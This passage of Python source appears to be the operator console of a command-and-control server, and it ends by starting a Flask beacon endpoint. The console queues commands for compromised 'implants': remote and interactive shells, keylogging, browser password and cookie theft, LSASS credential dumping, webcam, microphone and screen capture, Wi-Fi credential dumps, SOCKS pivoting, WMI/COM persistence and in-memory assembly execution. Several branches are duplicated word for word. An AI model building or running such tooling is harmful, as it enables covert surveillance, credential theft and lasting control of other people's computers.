                continue

            if action == "list":
                list_implants()
            elif action == "clear":
                os.system("cls" if os.name == "nt" else "clear")
            elif action == "exit":
                print("[*] Shutting down C2...")
                break
            elif action == "use":
                if len(parts) < 2:
                    print("[-] Usage: use <implant_id>")
                    continue
                target = parts[1].strip()
                if get_implant(target):
                    current = target
                    print(f"[*] Switched to {current[:8]}")
                else:
                    print("[-] Implant ID not found")
            elif not current:
                if action in ["status", "shell", "ishell", "sysinfo", "installed_software", "screenshot", "webcam", "upload", "download", "inject", "keylog", "wifi_dump", "wifi_scan"]:
                    print("[-] Select an implant first (use <id>)")
                else:
                    print(f"[-] Unknown command: {action}. Type 'help' for options.")
                continue

            # Target-specific commands
            elif action == "status":
                imp = get_implant_full(current)
                if imp:
                    host, user, f_seen, l_seen, l_shell, s_json = imp
                    status = "ONLINE" if is_implant_online(l_seen) else "OFFLINE"
                    color = "\x1b[1;32m" if status == "ONLINE" else "\x1b[1;31m"
                    print(f"\n--- Implant {current[:8]} Status ---")
                    print(f"  Status    : {color}{status}\x1b[0m")
                    print(f"  Host/User : {host} / {user}")
                    print(f"  First Seen: {f_seen}")
                    print(f"  Last Seen : {l_seen}")
                    pending = get_pending_tasks(current)
                    print(f"  Pending Tasks: {len(pending)}")
                else:
                    print("[-] Error fetching status")

            elif action == "shell":
                if len(parts) < 2:
                    print("[-] Usage: shell <command>")
                else:
                    add_task(current, "shell", " ".join(parts[1:]))
                    print("[>] Shell command queued")

            elif action == "ishell":
                if len(parts) < 2 or parts[1].lower() != "start":
                    print("[-] Usage: ishell start")
                else:
                    with lock:
                        ishell_sessions[current] = {"input_queue": [], "active": True}
                    add_task(current, "ishell", "start")
                    print(f"[*] Starting ishell on {current[:8]}... Type 'exit' to quit.")
                    while True:
                        try:
                            line = input("shell> ")
                            if line.lower() == "exit": break
                            with lock:
                                ishell_sessions[current]["input_queue"].append(line + "\n")
                        except (KeyboardInterrupt, EOFError): break
                    add_task(current, "ishell", "stop")
                    with lock: ishell_sessions[current]["active"] = False
                    print("[*] ishell session ended")

            elif action in ["sysinfo", "installed_software", "list_webcams", "screenshot", "wifi_dump", "wifi_scan", "browser_pass", "cookie_steal", "get_logs"]:
                add_task(current, action, "")
                print(f"[>] {action} task queued")

            elif action == "mic":
                    secs = 10
                    if len(parts) > 1:
                        try:
                            secs = int(parts[1])
                        except:
                            print("[-] Invalid seconds")
                            continue
                    add_task(current, "mic", str(secs))
                    print(f"[>] mic {secs}s queued")

            elif action == "webcam":
                cmd = " ".join(parts[1:])
                add_task(current, "webcam", cmd)
                print(f"[>] webcam task queued with args: '{cmd}'")

            elif action in ["webcam_stream", "screen_stream"]:
                if len(parts) < 2:
                    print(f"[-] Usage: {action} start|stop")
                else:
                    add_task(current, action, parts[1].lower())
                    print(f"[>] {action} {parts[1]} queued")

            elif action == "upload":
                if len(parts) < 2:
                    print("[-] Usage: upload <local_path>")
                else:
                    lpath = parts[1]
                    if os.path.isfile(lpath):
                        content = open(lpath, "rb").read()
                        b64 = base64.b64encode(content).decode()
                        fname = os.path.basename(lpath)
                        add_task(current, "file_upload", f"{fname}:{b64}")
                        print(f"[>] Uploading {fname} ({len(content)} bytes)...")
                    else:
                        print("[-] Local file not found")

            elif action == "download":
                if len(parts) < 2:
                    print("[-] Usage: download <remote_path>")
                else:
                    add_task(current, "file_download", parts[1])
                    print(f"[>] Download request for {parts[1]} queued")

            elif action == "dump_lsass":
                add_task(current, "dump_lsass", "")
                print("[>] LSASS dump task queued")

            elif action == "socks":
                if len(parts) < 2:
                    print("[-] Usage: socks start [port] | stop")
                else:
                    cmd = " ".join(parts[1:])
                    add_task(current, "socks_proxy", cmd)
                    print(f"[>] SOCKS proxy {cmd} queued")

            elif action == "persistence":
                if len(parts) < 2:
                    print("[-] Usage: persistence wmi|com [name/clsid]")
                else:
                    cmd = " ".join(parts[1:])
                    add_task(current, "adv_persistence", cmd)
                    print(f"[>] Advanced persistence ({cmd}) queued")

            elif action == "execute":
                if len(parts) < 2:
                    print("[-] Usage: execute <local_assembly_path> [args]")
                else:
                    local_path = parts[1]
                    if os.path.isfile(local_path):
                        content = open(local_path, "rb").read()
                        b64 = base64.b64encode(content).decode()
                        args = " ".join(parts[2:])
                        add_task(current, "execute_assembly", f"{b64}:{args}")
                        print(f"[>] Execute-Assembly ({os.path.basename(local_path)}) queued")
                    else:
                        print("[-] Assembly file not found")

            elif action == "dump_lsass":
                add_task(current, "dump_lsass", "")
                print("[>] LSASS dump task queued")

            elif action == "socks":
                if len(parts) < 2:
                    print("[-] Usage: socks start [port] | stop")
                else:
                    cmd = " ".join(parts[1:])
                    add_task(current, "socks_proxy", cmd)
                    print(f"[>] SOCKS proxy {cmd} queued")

            elif action == "persistence":
                if len(parts) < 2:
                    print("[-] Usage: persistence wmi|com [name/clsid]")
                else:
                    cmd = " ".join(parts[1:])
                    add_task(current, "adv_persistence", cmd)
                    print(f"[>] Advanced persistence ({cmd}) queued")

            elif action == "execute":
                if len(parts) < 2:
                    print("[-] Usage: execute <local_assembly_path> [args]")
                else:
                    local_path = parts[1]
                    if os.path.isfile(local_path):
                        content = open(local_path, "rb").read()
                        b64 = base64.b64encode(content).decode()
                        args = " ".join(parts[2:])
                        add_task(current, "execute_assembly", f"{b64}:{args}")
                        print(f"[>] Execute-Assembly ({os.path.basename(local_path)}) queued")
                    else:
                        print("[-] Assembly file not found")

            elif action == "keylog":
                if len(parts) < 2 or parts[1].lower() not in ["start", "stop", "dump"]:
                    print("[-] Usage: keylog start|stop|dump")
                else:
                    add_task(current, "keylog", parts[1].lower())
                    print(f"[>] Keylog {parts[1]} queued")

            else:
                print(f"[-] Unknown command: {action}. Type 'help' for options.")

        except (KeyboardInterrupt, EOFError):
            print("\n[*] CLI session terminated")
            break
        except Exception as e:
            print(f"[-] CLI error: {e}")
    os._exit(0)
if __name__ == '__main__':
    init_db()
    threading.Thread(target=cli, daemon=True).start()
    print("[*] C2 listening on https://localhost:8080/beacon")
    app.run(host='localhost', port=8080, debug=False, threaded=True)
